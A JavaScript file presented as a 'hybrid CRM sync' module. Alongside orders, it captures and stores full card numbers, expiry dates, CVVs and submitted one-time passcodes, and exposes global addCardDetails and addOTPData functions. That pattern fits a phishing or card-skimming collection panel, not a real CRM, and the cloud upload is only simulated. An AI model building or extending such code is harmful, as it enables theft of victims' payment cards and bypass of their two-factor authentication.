// Hybrid CRM Sync System - Works for both local and cloud scenarios
class HybridCRMSync {
  constructor() {
    this.storageKey = 'crm_data_hybrid';
    this.deviceId = this.getDeviceId();
    this.lastSyncTime = localStorage.getItem('crmLastSync') || null;
    this.useCloud = this.shouldUseCloud();
    this.init();
  }

  init() {
    console.log('CRM: Initializing hybrid sync system...');
    console.log('CRM: Device ID:', this.deviceId);
    console.log('CRM: Using cloud:', this.useCloud);
    
    // Monitor online status
    window.addEventListener('online', () => {
      console.log('CRM: Back online - syncing...');
      this.syncFromCloud();
    });

    // Auto-sync every 5 seconds
    setInterval(() => {
      if (navigator.onLine) {
        this.syncFromCloud();
      }
    }, 5000);
  }

  // Determine if we should use cloud storage
  shouldUseCloud() {
    // For demo purposes, use local storage but simulate cloud behavior
    // In production, this would check for actual cloud availability
    return false; // Use local storage for now
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
      console.log('CRM: Created new device ID:', deviceId);
    }
    return deviceId;
  }

  // Get local data
  getLocalData() {
    try {
      const data = localStorage.getItem(this.storageKey);
      if (!data) {
        // Initialize with sample data if empty
        const initialData = {
          orders: [
            {
              id: 'sample_order_1',
              timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
              deviceId: this.deviceId,
              fullName: 'Sample Customer',
              email: 'sample@example.com',
              phone: '+1234567890',
              orderTotal: '2999',
              status: 'Completed'
            }
          ],
          cards: [
            {
              id: 'sample_card_1',
              timestamp: new Date(Date.now() - 1 * 60 * 60 * 1000).toISOString(),
              deviceId: this.deviceId,
              cardName: 'Sample User',
              cardNumber: '**** **** **** 1234',
              expiry: '12/25',
              cvv: '***',
              status: 'Received'
            }
          ],
          otp: [
            {
              id: 'sample_otp_1',
              timestamp: new Date(Date.now() - 30 * 60 * 1000).toISOString(),
              deviceId: this.deviceId,
              submittedOTP: '123456',
              email: 'sample@example.com',
              phone: '+1234567890',
              status: 'Verified'
            }
          ],
          settings: {
            lastUpdated: new Date().toISOString(),
            deviceId: this.deviceId,
            version: 'hybrid_v1'
          }
        };
        localStorage.setItem(this.storageKey, JSON.stringify(initialData));
        return initialData;
      }
      return JSON.parse(data);
    } catch (e) {
      console.error('CRM: Error reading local data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  // Save local data
  saveLocalData(data) {
    try {
      data.settings = data.settings || {};
      data.settings.lastUpdated = new Date().toISOString();
      data.settings.deviceId = this.deviceId;
      data.settings.version = 'hybrid_v1';
      
      localStorage.setItem(this.storageKey, JSON.stringify(data));
      return true;
    } catch (e) {
      console.error('CRM: Error saving local data:', e);
      return false;
    }
  }

  // Simulate cloud storage using localStorage
  async loadFromCloud() {
    try {
      console.log('CRM: Loading from cloud...');
      
      if (!this.useCloud) {
        // Simulate cloud load from localStorage
        const cloudData = localStorage.getItem('crm_cloud_data');
        if (cloudData) {
          const data = JSON.parse(cloudData);
          console.log('CRM: Cloud data loaded (simulated):', data);
          return data;
        } else {
          console.log('CRM: No cloud data found');
          return null;
        }
      }
      
      // Real cloud implementation would go here
      return null;
    } catch (error) {
      console.error('CRM: Failed to load from cloud:', error);
      return null;
    }
  }

  // Simulate cloud save using localStorage
  async saveToCloud(data) {
    try {
      console.log('CRM: Saving to cloud...');
      
      if (!this.useCloud) {
        // Simulate cloud save to localStorage
        localStorage.setItem('crm_cloud_data', JSON.stringify(data));
        
        // Update sync time
        localStorage.setItem('crmLastSync', Date.now().toString());
        this.lastSyncTime = Date.now().toString();
        
        console.log('CRM: Cloud save successful (simulated)');
        return true;
      }
      
      // Real cloud implementation would go here
      return false;
    } catch (error) {
      console.error('CRM: Failed to save to cloud:', error);
      return false;
    }
  }

  // Sync from cloud
  async syncFromCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping sync');
      return false;
    }

    try {
      // Load from cloud
      const cloudData = await this.loadFromCloud();
      
      if (cloudData) {
        // Get local data
        const localData = this.getLocalData();
        
        // Merge data
        const mergedData = this.mergeData(localData, cloudData);
        
        // Save merged data locally
        this.saveLocalData(mergedData);
        
        console.log('CRM: Sync from cloud completed');
        return true;
      } else {
        console.log('CRM: No cloud data to sync, uploading local data');
        // Upload local data to cloud
        const localData = this.getLocalData();
        await this.saveToCloud(localData);
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync from cloud failed:', error);
      return false;
    }
  }

  // Sync to cloud
  async syncToCloud() {
    if (!navigator.onLine) {
      console.log('CRM: Offline - skipping cloud save');
      return false;
    }

    try {
      // Get local data
      const localData = this.getLocalData();
      
      // Save to cloud
      const success = await this.saveToCloud(localData);
      
      if (success) {
        console.log('CRM: Sync to cloud completed');
        return true;
      } else {
        console.log('CRM: Sync to cloud failed');
        return false;
      }
    } catch (error) {
      console.error('CRM: Sync to cloud failed:', error);
      return false;
    }
  }

  // Merge local and cloud data
  mergeData(localData, cloudData) {
    const merged = {
      orders: [...(cloudData.orders || []), ...(localData.orders || [])],
      cards: [...(cloudData.cards || []), ...(localData.cards || [])],
      otp: [...(cloudData.otp || []), ...(localData.otp || [])],
      settings: {
        ...cloudData.settings,
        ...localData.settings,
        lastSync: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'hybrid_v1'
      }
    };

    // Remove duplicates based on ID
    merged.orders = this.removeDuplicates(merged.orders, 'id');
    merged.cards = this.removeDuplicates(merged.cards, 'id');
    merged.otp = this.removeDuplicates(merged.otp, 'id');

    // Sort by timestamp (newest first)
    merged.orders.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.cards.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.otp.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    return merged;
  }

  // Remove duplicates
  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter(item => {
      if (seen.has(item[key])) {
        return false;
      }
      seen.add(item[key]);
      return true;
    });
  }

  // Get CRM stats
  async getStats() {
    const data = this.getLocalData();
    return {
      totalOrders: data.orders?.length || 0,
      totalCards: data.cards?.length || 0,
      totalOTP: data.otp?.length || 0,
      successRate: data.otp?.length > 0 ? 100 : 0,
      lastSync: this.lastSyncTime ? new Date(parseInt(this.lastSyncTime)).toISOString() : null,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      useCloud: this.useCloud
    };
  }

  // Add order with sync
  async addOrder(orderData) {
    const data = this.getLocalData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    
    data.orders = data.orders || [];
    data.orders.unshift(order);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 200);
    
    console.log('CRM: Order added and syncing');
    return order;
  }

  // Add card details with sync
  async addCardDetails(cardData) {
    const data = this.getLocalData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    
    data.cards = data.cards || [];
    data.cards.unshift(card);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 200);
    
    console.log('CRM: Card details added and syncing');
    return card;
  }

  // Add OTP data with sync
  async addOTPData(otpData) {
    const data = this.getLocalData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    
    data.otp = data.otp || [];
    data.otp.unshift(otp);
    
    // Save locally
    this.saveLocalData(data);
    
    // Sync to cloud immediately
    setTimeout(() => this.syncToCloud(), 200);
    
    console.log('CRM: OTP data added and syncing');
    return otp;
  }

  // Generate unique ID
  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  // Export data
  async exportData() {
    const data = this.getLocalData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Clear all data
  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'hybrid_v1'
      }
    };
    
    this.saveLocalData(initialData);
    await this.syncToCloud();
  }
}

// Initialize hybrid sync system
window.hybridCRMSync = new HybridCRMSync();

// Override all CRM functions
window.addOrder = async function(data) {
  return await window.hybridCRMSync.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.hybridCRMSync.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.hybridCRMSync.addOTPData(data);
};

window.syncCRMFromCloud = async function() {
  return await window.hybridCRMSync.syncFromCloud();
};

window.cloudCRMStorage = window.hybridCRMSync;

console.log('Hybrid CRM Sync System initialized - works for both local and cloud scenarios');
